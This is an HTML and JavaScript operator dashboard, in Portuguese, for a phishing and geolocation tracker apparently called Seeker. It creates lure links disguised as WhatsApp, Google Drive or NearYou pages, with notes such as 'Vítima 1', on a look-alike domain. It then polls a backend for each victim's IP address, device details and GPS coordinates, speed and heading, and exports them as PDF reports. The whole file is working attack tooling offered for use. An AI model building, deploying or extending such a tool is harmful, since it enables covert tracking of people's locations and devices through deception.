<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Controle - Seeker</title>
    <style>      
    
        body { 
            font-family: system-ui, sans-serif; 
            background-color: #f0f2f5; 
            display: flex; 
            justify-content: center; /* Centraliza horizontalmente o conteúdo total */
            align-items: flex-start; /* Alinha os blocos no topo */
            min-height: 100vh; 
            margin: 0; 
            padding: 20px; 
            gap: 20px; /* Espaço ENTRE a coluna esquerda e o display de rastreamento */
        }

        /* NOVO: Wrapper para a coluna da esquerda (Gerador + Consulta) */
        #left-column {
            display: flex;
            flex-direction: column; /* Empilha os itens verticalmente */
            gap: 20px; /* Espaço ENTRE o Gerador e a Consulta */
            width: 100%; /* Ocupa a largura total disponível na coluna */
            max-width: 450px; /* Mantém a largura máxima dos containers */
            flex-shrink: 0; /* Impede que a coluna encolha */
        }
        
        /* Container principal (usado por Gerador e Consulta) */
        .container { 
            background: white; 
            padding: 2rem 2.5rem; 
            border-radius: 12px; 
            box-shadow: 0 6px 20px rgba(0,0,0,0.08); 
            width: 100%; /* Garante que ocupem a largura da #left-column */
            box-sizing: border-box; /* Inclui padding na largura total */
        }
        
        h1, h2 { text-align: center; color: #1c1e21; margin-top: 0; margin-bottom: 1.5rem;}
        .form-group { margin-bottom: 1.25rem; }
        label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #333; }
        input, select, button, textarea { width: 100%; padding: 0.8rem; border-radius: 6px; border: 1px solid #ddd; box-sizing: border-box; font-size: 1rem; font-family: system-ui, sans-serif; }
        button { background-color: #007bff; color: white; border: none; cursor: pointer; font-weight: 600; transition: background-color 0.2s; }
        button:hover { background-color: #0056b3; }
        button:disabled { background-color: #a0a0a0; cursor: not-allowed; }
        #result-container { margin-top: 1.5rem; display: none; }
        .input-group { display: flex; }
        .input-group input { border-right: none; border-top-right-radius: 0; border-bottom-right-radius: 0; background-color: #fff; }
        .input-group button { width: auto; border-top-left-radius: 0; border-bottom-left-radius: 0; }
        .status { margin-top: 1rem; text-align: center; color: #65676b; }
        
        /* Layout do Display de Rastreamento (mantido) */
        #tracking-display {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0,0,0,0.08);
            width: 100%;
            max-width: 800px; 
            min-height: 400px; /* Ajuda a dar uma forma inicial */
            /* margin-top: 0; /* Não mais necessário */
            display: none;
            text-align: left;
            flex-grow: 1; /* Permite que o display use o espaço restante */
            box-sizing: border-box; /* Inclui padding na largura total */
        }

        #tracking-display h2 {
            text-align: center;
            color: #1c1e21;
            margin-bottom: 1.5rem;
        }
        .data-section {
            border: 1px solid #eee;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            background-color: #f9f9f9;
        }
        .data-item strong {
            display: inline-block;
            min-width: 120px;
            color: #0056b3;
        }
        .data-item {
            margin-bottom: 5px;
            border-bottom: 1px dotted #ddd;
            padding-bottom: 3px;
        }
        .data-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        .status-header {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 10px;
        }

        /* Responsividade (ajustada) */
        @media (max-width: 1200px) { /* Ajuste este valor se necessário */
            body {
                flex-direction: column; /* Empilha tudo verticalmente em telas menores */
                align-items: center; /* Centraliza os blocos */
                gap: 20px; 
            }
            #left-column {
                 max-width: 90%; /* Coluna esquerda ocupa mais largura */
                 width: 100%; /* Garante que ocupe a largura disponível */
                 align-items: center; /* Centraliza containers dentro da coluna */
            }
            .container, #tracking-display {
                max-width: 100%; /* Ocupam a largura total da coluna pai */
                width: 100%;
            }
             #tracking-display {
                 margin-top: 0; /* Remove margem extra em telas pequenas */
             }
        }
    </style>
</head>
<body>
    <div id="left-column"> 
        
        <div class="container"> <h1>Gerador de Link</h1>
            <div class="form-group">
                <label for="template">Template:</label>
                <select id="template">
                    <option value="2">WhatsApp</option>
                    <option value="1">Google Drive</option>
                    <option value="0">NearYou</option>
                </select>
            </div>
            <div class="form-group">
                <label for="groupTitle">Título da Isca:</label>
                <input type="text" id="groupTitle" placeholder="Ex: Vaga de Emprego Urgente">
            </div>
            <div class="form-group">
                <label for="linkDescription">Descrição (Anotações):</label>
                <textarea id="linkDescription" rows="3" placeholder="Ex: Vítima 1, Teste 01/01/2026, Enviado via Telegram."></textarea>
            </div>
            <div class="form-group">
                <label for="groupImage">Imagem do Grupo (opcional):</label>
                <input type="file" id="groupImage" accept="image/png, image/jpeg">
            </div>
            <button id="generateBtn">Gerar Link</button>
            
            <div class="status" id="status-text"></div>

            <div id="result-container">
                <label for="result-url">Link Gerado:</label>
                <div class="input-group">
                    <input type="text" id="result-url" readonly>
                    <button id="copy-btn">Copiar</button>
                </div>
            </div>
        </div> <div class="container" id="search-container">
            <h2>Consultar Rastreamento</h2>
            <div class="form-group">
                <label for="search-id-input">ID de Rastreamento:</label>
                <input type="text" id="search-id-input" placeholder="Cole o ID aqui">
            </div>
            <button id="search-btn">Buscar</button>
            <div class="status" id="search-status" style="margin-top: 1rem;"></div>
        </div>
        </div> <div id="tracking-display"> <h2>Status de Rastreamento: <span id="current-tracking-id">N/A</span></h2>
        <button id="export-pdf-btn" style="margin-top: 20px; background-color: #dc3545;" disabled>Exportar como PDF</button>

        <div id="tracking-status-message" class="status-header">Aguardando geração ou consulta...</div>

        <div id="description-section" class="data-section" style="display: none;">
            <div class="status-header" style="color: #6c757d;">Descrição da Isca</div>
            <div id="description-data"></div>
        </div>
                
        <div id="server-info-section" class="data-section" style="display: none;">
            <div class="status-header" style="color: #6c757d;">Informações de Rede (Server)</div>
            <div id="server-info-data"></div>
        </div>

        <div id="device-info-section" class="data-section" style="display: none;">
            <div class="status-header" style="color: #007bff;">Informações do Dispositivo (Info)</div>
            <div id="device-info-data"></div>
        </div>

        <div id="location-section" class="data-section" style="display: none;">
            <div class="status-header" style="color: #28a745;">Localização (Result)</div>
            <div id="location-data"></div>
        </div>
        
        <div id="error-section" class="data-section" style="display: none;">
            <div class="status-header" style="color: #dc3545;">Erro de Rastreamento (Error)</div>
            <div id="error-data"></div>
        </div>
        
    </div> <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
<script>
    // --- Seletores Globais ---
    const generateBtn = document.getElementById('generateBtn');
    const resultContainer = document.getElementById('result-container');
    const resultUrlInput = document.getElementById('result-url');
    const copyBtn = document.getElementById('copy-btn');
    const statusText = document.getElementById('status-text');
    const trackingDisplay = document.getElementById('tracking-display');
    const currentTrackingId = document.getElementById('current-tracking-id');
    const trackingStatusMessage = document.getElementById('tracking-status-message');
    
    // Elementos de exibição de dados
    const deviceSection = document.getElementById('device-info-section');
    const deviceData = document.getElementById('device-info-data');
    const locationSection = document.getElementById('location-section');
    const locationData = document.getElementById('location-data');
    const errorSection = document.getElementById('error-section');
    const errorData = document.getElementById('error-data');
    const serverSection = document.getElementById('server-info-section');
    const serverData = document.getElementById('server-info-data');
    const descriptionSection = document.getElementById('description-section');
    const descriptionData = document.getElementById('description-data');

    // Elementos do formulário de geração
    const templateSelect = document.getElementById('template');
    const groupTitleInput = document.getElementById('groupTitle');
    const groupImageInput = document.getElementById('groupImage');
    const linkDescriptionInput = document.getElementById('linkDescription');
    
    // Elementos do PDF
    const exportPdfBtn = document.getElementById('export-pdf-btn');

    // Elementos da consulta
    const searchIdInput = document.getElementById('search-id-input');
    const searchBtn = document.getElementById('search-btn');
    const searchStatus = document.getElementById('search-status');

    // --- Variáveis Globais ---
    let activeTrackingId = null; // ID sendo monitorado (gerado ou consultado)
    let fetchInterval = null;    // Referência ao setInterval para polling
    
    // URL Base da API
    const API_BASE_URL = "https://chat.whatsapps.site"; // Ou o URL do seu backend

    // Mapeamento de Chaves para exibição limpa
    const KEY_MAP = {
        'clientIp': 'IP', 'Ptf': 'Plataforma (Ptf)', 'Brw': 'Navegador (Brw)',
        'Ven': 'Fabricante GPU', 'Cc': 'Núcleos CPU (Cc)', 'Ram': 'RAM (GB)',
        'Ren': 'GPU Renderer', 'Ht': 'Altura Tela', 'Wd': 'Largura Tela',
        'Os': 'OS Completo', 'Status': 'Status', 'Lat': 'Latitude',
        'Lon': 'Longitude', 'Acc': 'Precisão (m)', 'Alt': 'Altitude',
        'Dir': 'Direção', 'Spd': 'Velocidade', 'trackingId': 'Tracking ID'
    };

    // --- Funções Auxiliares ---

    // Copiar para área de transferência
    copyBtn.addEventListener('click', () => {
        resultUrlInput.select();
        try {
            document.execCommand('copy');
            copyBtn.textContent = 'Copiado!';
        } catch (err) {
            copyBtn.textContent = 'Falhou!';
            console.error('Erro ao copiar:', err);
        }
        setTimeout(() => { copyBtn.textContent = 'Copiar'; }, 2000);
    });
    
    // Renderizar dados na UI
    function renderData(data, targetElement) {
        let html = '';
        const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd'];
        const keys = (targetElement.id === 'location-data') 
            ? Object.keys(data).sort((a, b) => {
                const idxA = locationOrder.indexOf(a);
                const idxB = locationOrder.indexOf(b);
                if (idxA !== -1 && idxB !== -1) return idxA - idxB;
                if (idxA !== -1) return -1;
                if (idxB !== -1) return 1;
                return 0; // Mantém ordem original para chaves não listadas
              })
            : Object.keys(data);

        for (const key of keys) {
            if (key === 'trackingId') continue; // Já exibido no título
            const formattedKey = KEY_MAP[key] || key.replace(/([A-Z])/g, ' $1').trim();
            let displayValue = data[key] === null || data[key] === undefined ? 'N/A' : data[key];
            let valueHtml = String(displayValue); // Converte para string

            if (key === 'clientIp' && valueHtml.length > 20) {
                 valueHtml = `<span style="word-break: break-all;">${valueHtml}</span>`;
            }
             if (key === 'Os' && valueHtml.includes('(')) { // Limpa User Agent longo
                 valueHtml = valueHtml.substring(0, valueHtml.indexOf('(')).trim();
             }
            
            html += `<div class="data-item"><strong>${formattedKey}:</strong> ${valueHtml}</div>`;
        }
        targetElement.innerHTML = html || '<div class="data-item">Nenhum dado disponível.</div>';
    }

    // Gerar código aleatório
    function generateRandomCode(length = 16) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        return result;
    }

    // Limpar e preparar área de exibição
    function resetTrackingDisplay(idToShow) {
        trackingDisplay.style.display = 'block';
        currentTrackingId.textContent = idToShow || 'N/A';
        trackingStatusMessage.textContent = 'Consultando status...';
        descriptionSection.style.display = 'none';
        serverSection.style.display = 'none';
        deviceSection.style.display = 'none';
        locationSection.style.display = 'none';
        errorSection.style.display = 'none';
        descriptionData.innerHTML = '';
        serverData.innerHTML = '';
        deviceData.innerHTML = '';
        locationData.innerHTML = '';
        errorData.innerHTML = '';
        exportPdfBtn.disabled = true; // Desabilita PDF por padrão
    }

    // Exibir dados recebidos (usado por fetch e search)
    function displayReceivedData(data) {
        let mainStatus = 'Status consultado.';

        if (data.status === 'RECEIVED') {
            mainStatus = '✅ Informações recebidas/encontradas!';
            exportPdfBtn.disabled = false; // Habilita PDF

            // Exibe Descrição
            if (data.description || data.title) {
                descriptionSection.style.display = 'block';
                descriptionData.innerHTML = `
                    <div class="data-item"><strong>Título:</strong> ${data.title || 'N/A'}</div>
                    <div class="data-item" style="border-bottom: none;"><strong>Anotações:</strong> ${(data.description || 'Nenhuma').replace(/\n/g, '<br>')}</div>
                `;
            }
            // Exibe IP
            if (data.clientIp) {
                serverSection.style.display = 'block';
                renderData({ clientIp: data.clientIp }, serverData);
            }
            // Exibe Info Dispositivo
            if (data.info) {
                deviceSection.style.display = 'block';
                renderData(data.info, deviceData);
            }
            // Exibe Localização
            if (data.result) {
                locationSection.style.display = 'block';
                renderData(data.result, locationData);
                mainStatus = '✅ Localização encontrada!';
            }
            // Exibe Erros
            if (data.error) {
                errorSection.style.display = 'block';
                renderData(data.error, errorData);
                // Dá prioridade à mensagem de erro se ambos (result e error) existirem
                mainStatus = '⚠️ Erro registrado ao obter localização.';
            }

        } else if (data.status === 'ACTIVE') {
            mainStatus = 'Link ativo, aguardando primeiro acesso...';
        } else if (data.status === 'INACTIVE' || !data.status) {
             mainStatus = 'ID não encontrado ou inativo.';
             trackingDisplay.style.display = 'none'; // Esconde display se inativo
        } else {
             mainStatus = `Status desconhecido: ${data.status}`;
        }
        
        trackingStatusMessage.textContent = mainStatus;
    }


    // --- Lógica Principal ---

    // Função de Polling (chamada após gerar link)
    async function fetchTrackingStatus() {
        if (!activeTrackingId || !fetchInterval) return; // Só roda se tiver ID ativo e polling iniciado

        try {
            const fetchUrl = `${API_BASE_URL}/api/status?id=${activeTrackingId}`;
            console.log(`[DEBUG POLLING] Buscando status em: ${fetchUrl}`);
            const response = await fetch(fetchUrl);

            if (!response.ok) {
                console.error(`[DEBUG POLLING ERRO] Status HTTP: ${response.status}. URL: ${fetchUrl}`);
                trackingStatusMessage.textContent = `Erro ao buscar (${response.status}).`;
                // Não para o polling em caso de erro temporário, mas poderia parar se fosse 404
                // if (response.status === 404) clearInterval(fetchInterval); 
                return;
            }
            
            const data = await response.json();
            
            // Usa a função centralizada para exibir os dados
            displayReceivedData(data);

            // Para o polling se o status for RECEIVED ou INACTIVE
            if (data.status === 'RECEIVED' || data.status === 'INACTIVE') {
                console.log(`[DEBUG POLLING] Status final (${data.status}). Parando polling para ${activeTrackingId}.`);
                clearInterval(fetchInterval);
                fetchInterval = null;
            }

        } catch (error) {
            console.error(`[DEBUG POLLING CATCH] Erro: ${error.name} - ${error.message}`);
            trackingStatusMessage.textContent = 'Erro de conexão no polling.';
            // Considerar parar o polling em caso de erro de rede persistente
            // clearInterval(fetchInterval); fetchInterval = null;
        }
    }

    // Geração de Link
    generateBtn.addEventListener('click', async () => {
        const title = groupTitleInput.value.trim();
        const description = linkDescriptionInput.value.trim();
        const template = templateSelect.value;
        const imageFile = groupImageInput.files[0];
        
        if (!title) {
            alert('Por favor, insira um título para a isca.');
            return;
        }

        // Limpa polling anterior
        if (fetchInterval) clearInterval(fetchInterval); fetchInterval = null;

        const tracking_id = generateRandomCode(16); 
        activeTrackingId = tracking_id; // Define ID ativo para polling e PDF
        
        // Limpa UI
        resetTrackingDisplay(tracking_id);
        trackingStatusMessage.textContent = 'Gerando link...';
        resultContainer.style.display = 'none';
        statusText.textContent = 'Iniciando serviços, aguarde...';
        generateBtn.disabled = true;
        generateBtn.textContent = 'Gerando...';

        // Prepara FormData
        let fileExtension = '';
        if (imageFile) {
            fileExtension = imageFile.name.substring(imageFile.name.lastIndexOf('.'));
        }
        const formData = new FormData();
        formData.append('template', template);
        formData.append('groupTitle', title);
        formData.append('linkDescription', description);
        formData.append('trackingId', tracking_id); 
        formData.append('imageExt', fileExtension); 
        if (imageFile) formData.append('groupImage', imageFile);

        // Chamada API para gerar link
        try {
            const response = await fetch(`${API_BASE_URL}/generate-link`, { 
                method: 'POST',
                body: formData,
            });
            const data = await response.json();

            if (data.success && data.url) {
                const final_url = `${data.url}?id=${tracking_id}`; 
                statusText.textContent = 'Link gerado com sucesso!';
                resultContainer.style.display = 'block';
                resultUrlInput.value = final_url;
                trackingStatusMessage.textContent = 'Aguardando primeiro acesso...';
                
                // Inicia o polling
                fetchInterval = setInterval(fetchTrackingStatus, 3000); 
                
            } else {
                statusText.textContent = `Erro ao gerar link: ${data.message || 'Erro desconhecido.'}`;
                 trackingStatusMessage.textContent = 'Falha na geração.';
                 activeTrackingId = null; // Reseta ID ativo se falhou
                 trackingDisplay.style.display = 'none';
            }
        } catch (error) {
            statusText.textContent = 'Erro de conexão ao gerar link.';
            trackingStatusMessage.textContent = 'Erro de conexão.';
            activeTrackingId = null;
            trackingDisplay.style.display = 'none';
            console.error('Erro Geração:', error);
        } finally {
            generateBtn.disabled = false;
            generateBtn.textContent = 'Gerar Link';
        }
    });

    // Consulta de Rastreamento
    searchBtn.addEventListener('click', async () => {
        const trackingIdToSearch = searchIdInput.value.trim();

        if (!trackingIdToSearch) {
            searchStatus.textContent = 'Por favor, insira um ID de rastreamento.';
            searchStatus.style.color = '#dc3545';
            return;
        }

        // Limpa polling anterior
        if (fetchInterval) {
            clearInterval(fetchInterval);
            fetchInterval = null;
            console.log('[DEBUG SEARCH] Intervalo de polling anterior limpo.');
        }

        // Feedback visual
        searchStatus.textContent = 'Buscando informações...';
        searchStatus.style.color = '#65676b';
        searchBtn.disabled = true;
        resetTrackingDisplay(trackingIdToSearch); // Limpa e prepara a área de exibição

        // Chamada API para buscar status
        try {
            const fetchUrl = `${API_BASE_URL}/api/status?id=${trackingIdToSearch}`;
            console.log(`[DEBUG SEARCH] Buscando em: ${fetchUrl}`);
            const response = await fetch(fetchUrl);

            if (!response.ok) {
                 searchStatus.textContent = `ID "${trackingIdToSearch}" não encontrado (${response.status}).`;
                searchStatus.style.color = '#dc3545';
                trackingStatusMessage.textContent = 'ID não encontrado.';
                trackingDisplay.style.display = 'none'; // Esconde se não achou
                activeTrackingId = null; // Reseta ID ativo
                 console.error(`[DEBUG SEARCH ERRO] Status HTTP: ${response.status}.`);
                 return; 
            }

            const data = await response.json();
            searchStatus.textContent = ''; // Limpa status da busca se ok

            // Define o ID consultado como ativo para o botão PDF
            activeTrackingId = trackingIdToSearch; 
            
            // Usa a função centralizada para exibir os dados
            displayReceivedData(data); 

        } catch (error) {
            console.error(`[DEBUG SEARCH CATCH] Erro: ${error.name} - ${error.message}`);
             searchStatus.textContent = 'Erro de conexão ou ao processar dados.';
            searchStatus.style.color = '#dc3545';
            trackingStatusMessage.textContent = 'Erro na consulta.';
            trackingDisplay.style.display = 'none';
            activeTrackingId = null;
        } finally {
            searchBtn.disabled = false; // Reabilita o botão
        }
    });

    // --- Exportação PDF ---
    
    // Converte objeto para dados de tabela PDF
    function objectToTableData(data) {
        const tableData = [];
        const locationOrder = ['Status', 'Lat', 'Lon', 'Acc', 'Alt', 'Dir', 'Spd']; // Ordem específica para localização
        
        // Mapeamento específico para PDF (pode ser igual ao KEY_MAP)
        const KEY_MAP_PDF = { ...KEY_MAP }; // Copia o mapeamento principal

        // Ordena chaves
        const keys = Object.keys(data).sort((a, b) => {
            const indexA = locationOrder.indexOf(a);
            const indexB = locationOrder.indexOf(b);
            if (indexA !== -1 && indexB !== -1) return indexA - indexB; // Ordena por locationOrder
            if (indexA !== -1) return -1; // Chaves de locationOrder vêm primeiro
            if (indexB !== -1) return 1;
             return 0; // Mantém ordem original das demais
        });
        
        for (const key of keys) {
            if (key === 'trackingId') continue; // Já está no título do PDF
            const formattedKey = KEY_MAP_PDF[key] || key.replace(/([A-Z])/g, ' $1').trim();
            let displayValue = data[key] === null || data[key] === undefined ? 'N/A' : String(data[key]);

            // Formatação específica para PDF
            if (key === 'Os' && displayValue.includes('Windows NT 10.0')) {
                 displayValue = 'Windows 10/11';
            }
             if (key === 'Os' && displayValue.includes('(')) { // Limpa User Agent longo
                 displayValue = displayValue.substring(0, displayValue.indexOf('(')).trim();
             }

            tableData.push([formattedKey, displayValue]);
        }
        return tableData;
    }

    // Evento do botão Exportar PDF
    exportPdfBtn.addEventListener('click', () => {
        if (!activeTrackingId) {
            alert("Nenhum ID de rastreamento ativo para exportar.");
            return;
        }

        // Busca os dados mais recentes antes de exportar
        fetch(`${API_BASE_URL}/api/status?id=${activeTrackingId}`)
            .then(res => {
                if (!res.ok) throw new Error(`Falha ao buscar dados: ${res.status}`);
                return res.json();
            })
            .then(data => {
                if (data.status !== 'RECEIVED') {
                    alert("Ainda não há dados recebidos para este ID ou o ID é inválido.");
                     // Adiciona verificação extra para dados realmente existentes
                     if (!data.clientIp && !data.info && !data.result && !data.error) {
                         console.warn("[PDF Export] Tentativa de exportar ID sem dados recebidos.");
                         return;
                     }
                }

                const { jsPDF } = window.jspdf;
                const doc = new jsPDF('p', 'mm', 'a4'); 
                let yOffset = 15;
                const pageHeight = doc.internal.pageSize.height;
                const marginBottom = 15; // Margem inferior

                // Função para adicionar nova página se necessário
                const checkNewPage = (neededHeight) => {
                    if (yOffset + neededHeight > pageHeight - marginBottom) {
                        doc.addPage();
                        yOffset = 15; // Reinicia yOffset na nova página
                    }
                };
                
                // --- TÍTULO GERAL E ID ---
                doc.setFontSize(16);
                doc.text(`Relatório de Rastreamento`, doc.internal.pageSize.width / 2, yOffset, { align: 'center' });
                yOffset += 8;
                doc.setFontSize(10);
                doc.setTextColor(100); 
                doc.text(`Tracking ID: ${activeTrackingId}`, doc.internal.pageSize.width / 2, yOffset, { align: 'center' });
                yOffset += 10;
                doc.setTextColor(0); 

                // --- DESCRIÇÃO DA ISCA ---
                if (data.title || data.description) {
                     checkNewPage(20); 
                    doc.setFontSize(12);
                    doc.setFont(undefined, 'bold');
                    doc.text('Descrição da Isca', 10, yOffset);
                    yOffset += 7;
                    doc.setFontSize(10);
                    doc.setFont(undefined, 'normal');
                    
                    doc.setFont(undefined, 'bold'); doc.text(`Título:`, 10, yOffset);
                    doc.setFont(undefined, 'normal'); doc.text(`${data.title || 'N/A'}`, 40, yOffset);
                    yOffset += 6;
                    
                    doc.setFont(undefined, 'bold'); doc.text(`Anotações:`, 10, yOffset);
                    doc.setFont(undefined, 'normal');
                    const annotations = data.description || 'Nenhuma anotação fornecida.';
                    const textLines = doc.splitTextToSize(annotations, doc.internal.pageSize.width - 20 - 30); // Largura da página - margens - recuo
                    doc.text(textLines, 40, yOffset);
                    yOffset += (textLines.length * 5) + 6; 
                }

                const headStyles = { fillColor: [220, 220, 220], textColor: [0, 0, 0], fontStyle: 'bold' };
                const tableConfig = {
                    startY: yOffset + 4, // Y inicial da tabela
                    head: [['Campo', 'Valor']],
                    theme: 'striped',
                    styles: { fontSize: 9, cellPadding: 2, overflow: 'linebreak' }, // overflow para quebrar texto longo
                    headStyles: headStyles,
                    columnStyles: { 
                        0: { fontStyle: 'bold', cellWidth: 50 }, // Coluna Campo
                        1: { cellWidth: 'auto'} // Coluna Valor ajusta automaticamente
                    },
                    margin: { left: 10 }, // Só margem esquerda, autoTable cuida da direita
                    tableWidth: 'auto', // Largura da tabela se ajusta ao conteúdo
                    didDrawPage: (hookData) => { yOffset = hookData.cursor.y; } // Atualiza yOffset global
                };

                // --- DADOS DE REDE E DISPOSITIVO (TABELA 1) ---
                 checkNewPage(20); 
                doc.setFontSize(12);
                doc.setFont(undefined, 'bold');
                doc.text('Dados de Coleta (Rede e Dispositivo)', 10, yOffset);
                yOffset += 1; // Menos espaço após título da seção
                doc.setFont(undefined, 'normal');
                
                const combinedData = { ...(data.clientIp ? { clientIp: data.clientIp } : {}), ...data.info };
                if (Object.keys(combinedData).length > 0) {
                    doc.autoTable({ ...tableConfig, body: objectToTableData(combinedData) });
                    yOffset = doc.autoTable.previous.finalY; // Pega o Y final da tabela desenhada
                } else {
                     doc.setFontSize(9);
                     doc.text("Nenhum dado de rede/dispositivo coletado.", 10, yOffset + 6);
                     yOffset += 10;
                }

                // --- DADOS DE LOCALIZAÇÃO (TABELA 2) ---
                if (data.result || data.error) {
                     yOffset += 8; // Espaço antes da próxima seção
                     checkNewPage(20); 
                    doc.setFontSize(12);
                     doc.setFont(undefined, 'bold');
                    doc.text(data.result ? 'Resultados de Geolocalização' : 'Erro de Geolocalização', 10, yOffset);
                    yOffset += 1;
                     doc.setFont(undefined, 'normal');

                    const locationResultStore = data.result || data.error;
                    doc.autoTable({ ...tableConfig, startY: yOffset + 4, body: objectToTableData(locationResultStore) });
                    yOffset = doc.autoTable.previous.finalY;
                } else if (Object.keys(combinedData).length > 0) { // Só mostra se a tabela anterior foi mostrada
                     yOffset += 8;
                     checkNewPage(10);
                     doc.setFontSize(9);
                     doc.text("Nenhum dado de geolocalização recebido.", 10, yOffset);
                     yOffset += 10;
                }

                // Salva o PDF
                doc.save(`Rastreamento_${activeTrackingId}.pdf`);

            }).catch(error => {
                alert('Falha ao gerar PDF: ' + error.message);
                console.error('PDF Export Error:', error);
            });
    });

</script>
</body>
</html>
